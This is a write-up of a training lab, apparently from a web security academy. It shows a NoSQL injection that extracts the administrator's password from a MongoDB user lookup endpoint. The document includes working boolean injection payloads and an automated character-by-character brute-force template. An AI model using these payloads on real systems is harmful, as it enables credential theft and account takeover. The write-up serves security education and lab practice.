## 1. Initial reconnaissance
- Logged in as `wiener:peter`.
- Observed lookup request:
```
GET /user/lookup?user=wiener
```
- The server returned full user data → direct DB fetch confirmed.
- Suspected unsafely constructed MongoDB query.

## 2. Testing methodology
Validated NoSQL injection by comparing responses:

### Correct character test:
```
wiener' && this.password[0] == 'p' || 'a'=='b
```
Response: user found → true condition.

### Incorrect character test:
```
wiener' && this.password[0] == 'a' || 'a'=='b
```
Response: “Could not find user” → false condition.

## 3. Payload construction
### Step 1: Identify password length
```
administrator' && this.password.length < 17 || 'a'=='b
```
Server returned valid result → length < 17.

Repeated to narrow down exact length.

### Step 2: Brute-force each character
Intruder “cluster bomb” with payload:
```
/user/lookup?user=administrator' && this.password[$0$] == '$x$' || 'a'=='b
```
- Position 1: index 0–15  
- Position 2: characters a–z, A–Z, 0–9  

Successful guesses produced responses of length **209**, failed attempts **151**.

### Step 3: Confirm character classes
```
this.password.match(/\d/)      → false
this.password.match(/[a-z]/)   → true
this.password.match(/[A-Z]/)   → false
```

## 4. Completing the attack
- Rebuilt administrator password (example: `lfcvgavx`).
- Logged in via normal login page.
- Successfully authenticated as administrator.
